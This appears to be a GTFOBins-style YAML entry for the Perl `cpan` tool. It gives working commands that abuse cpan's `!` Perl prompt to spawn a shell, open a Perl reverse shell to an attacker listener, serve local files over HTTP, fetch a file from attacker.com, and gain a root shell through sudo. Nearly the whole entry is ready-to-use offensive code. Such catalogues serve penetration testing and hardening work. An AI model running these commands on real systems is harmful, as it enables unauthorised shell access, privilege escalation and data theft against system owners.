---
functions:
  shell:
    - description: |
        `cpan` lets you execute perl commands with the `! command`.
      code: |
        cpan
        ! exec '/bin/bash'
  reverse-shell:
    - description: Run `nc -lvp RPORT` on the attacker box to receive the shell.
      code: |
        export RHOST=localhost
        export RPORT=9000
        cpan
        ! use Socket; my $i="$ENV{RHOST}"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};
  file-upload:
    - description: Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.
      code: |
        cpan
        ! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();
  file-download:
    - description: Fetch a remote file via an HTTP GET request and store it in `PWD`.
      code: |
        export URL=http://attacker.com/file_to_get
        cpan
        ! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{URL}"))->fetch();
  sudo:
    - code: |
        sudo cpan
        ! exec '/bin/bash'
---
